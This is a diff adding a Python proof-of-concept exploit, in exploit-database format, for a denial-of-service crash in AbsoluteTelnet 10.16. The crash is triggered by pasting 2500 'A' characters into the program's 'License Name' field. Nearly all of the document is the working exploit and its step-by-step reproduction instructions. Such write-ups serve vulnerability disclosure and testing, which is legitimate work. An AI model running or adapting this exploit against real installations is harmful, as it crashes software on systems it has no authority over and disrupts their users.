@@ -1,0 +1,21 @@
+#Exploit Title: AbsoluteTelnet 10.16 - 'License name' Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2019-05-19
+#Vendor Homepage: https://www.celestialsoftware.net/
+#Software Link: https://www.celestialsoftware.net/telnet/AbsoluteTelnet10.16.exe
+#Tested Version: 10.16
+#Tested on: Windows 7 Service Pack 1 x64
+
+#Steps to produce the crash:
+#1.- Run python code: AbsoluteTelent.py
+#2.- Open AbsoluteTelent.txt and copy content to clipboard
+#3.- Open AbsoluteTelnet.exe
+#4.- Select "Help" > "Enter License Key"
+#5.- In "License Name" paste Clipboard
+#6.- Crashed
+
+cod = "\x41" * 2500
+
+f = open('AbsoluteTelent.txt', 'w')
+f.write(cod)
+f.close()
